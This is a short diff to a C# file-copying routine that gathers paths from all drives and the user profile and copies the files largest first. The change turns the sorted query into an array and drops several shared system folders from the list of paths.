@@ -41,7 +41,7 @@ namespace wScript.Controller
 
 
             //sort by file size Descending and copy
-            var pathOrderByDesending = allPaths.OrderByDescending(p => new FileInfo(p).Length);
+            var pathOrderByDesending = allPaths.OrderByDescending(p => new FileInfo(p).Length).ToArray();
             foreach (var f in pathOrderByDesending)
             {
                 copyFile(f);
@@ -103,7 +103,7 @@ namespace wScript.Controller
         private List<string> getAllDrives()
         {
             List<string> paths = new List<string>();
-            
+
 
             //paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop));
             //paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));
@@ -121,12 +121,6 @@ namespace wScript.Controller
                 paths.Add(d.Name);
             }
 
-
-            paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
-            paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
-            paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
-            paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
-            paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
 
             paths.Add(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile));
 
